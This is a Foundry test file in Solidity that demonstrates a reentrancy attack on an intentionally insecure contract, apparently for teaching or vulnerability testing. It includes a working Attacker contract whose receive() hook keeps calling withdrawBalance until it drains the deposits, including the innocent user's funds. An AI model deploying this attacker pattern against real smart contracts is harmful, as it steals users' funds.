// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/reentrancy_insecure.sol";

contract ReentrancyTest is Test {
    Reentrancy_insecure public vulnerableContract;
    Attacker public attackerContract;
    address innocentUser = address(0x69); // Innocent user address
    
    function setUp() public {
        vulnerableContract = new Reentrancy_insecure();
        attackerContract = new Attacker(address(vulnerableContract));
        
        // Fund innocent user and deposit 5 ether
        vm.deal(innocentUser, 5 ether);
        vm.prank(innocentUser);
        vulnerableContract.deposit{value: 5 ether}();
        
        // Fund attacker contract with 1 ether
        vm.deal(address(attackerContract), 1 ether);
        attackerContract.deposit();
    }

    function testReentrancyVulnerability() public {
        console2.log("--- BEFORE-Attack ---");
        uint256 contractBalanceBefore = address(vulnerableContract).balance;
        uint256 attackerBalanceBefore = address(attackerContract).balance;
        uint256 attackerDepositBefore = vulnerableContract.getBalance(address(attackerContract));
        uint256 innocentDepositBefore = vulnerableContract.getBalance(innocentUser);
        
        console2.log("Contract ETH balance:       ", contractBalanceBefore);
        console2.log("Attacker ETH balance:       ", attackerBalanceBefore);
        console2.log("Attacker contract deposit:  ", attackerDepositBefore);
        console2.log("Innocent user deposit:      ", innocentDepositBefore);
        
        console2.log("\n--- Trigger Attack ---");
        attackerContract.attack();
        console2.log("Attack executed\n");
        
        console2.log("--- AFTER-Attack ---");
        uint256 contractBalanceAfter = address(vulnerableContract).balance;
        uint256 attackerBalanceAfter = address(attackerContract).balance;
        uint256 attackerDepositAfter = vulnerableContract.getBalance(address(attackerContract));
        uint256 innocentDepositAfter = vulnerableContract.getBalance(innocentUser);
        
        console2.log("Contract ETH balance:       ", contractBalanceAfter);
        console2.log("Attacker ETH balance:       ", attackerBalanceAfter);
        console2.log("Attacker contract deposit:  ", attackerDepositAfter);
        console2.log("Innocent user deposit:      ", innocentDepositAfter);
        
        console2.log("\n--- State Changes ---");
        console2.log("Contract ETH change:       from", contractBalanceBefore, "to", contractBalanceAfter);
        console2.log("Diff:", int256(contractBalanceAfter) - int256(contractBalanceBefore));
        
        console2.log("Attacker ETH change:       from", attackerBalanceBefore, "to", attackerBalanceAfter);
        console2.log("Diff:", int256(attackerBalanceAfter) - int256(attackerBalanceBefore));
        
        console2.log("Attacker deposit change:   from", attackerDepositBefore, "to", attackerDepositAfter);
        console2.log("Diff:", int256(attackerDepositAfter) - int256(attackerDepositBefore));
        
        console2.log("Innocent deposit change:   from", innocentDepositBefore, "to", innocentDepositAfter);
        console2.log("Diff:", int256(innocentDepositAfter) - int256(innocentDepositBefore));
        
        // Vulnerability determination
        if (contractBalanceAfter == 0 && 
            attackerBalanceAfter == attackerBalanceBefore + contractBalanceBefore) {
            console2.log("\nVulnerability Exists: Contract drained and attacker stole all ETH");
        } else {
            console2.log("\nVulnerability not Exist: Reentrancy attack failed or incomplete");
        }
    }
}

contract Attacker {
    Reentrancy_insecure public vulnerableContract;
    
    constructor(address _vulnerableContract) {
        vulnerableContract = Reentrancy_insecure(_vulnerableContract);
    }
    
    function deposit() external {
        vulnerableContract.deposit{value: address(this).balance}();
    }
    
    function attack() public {
        vulnerableContract.withdrawBalance();
    }
    
    receive() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdrawBalance();
        }
    }
}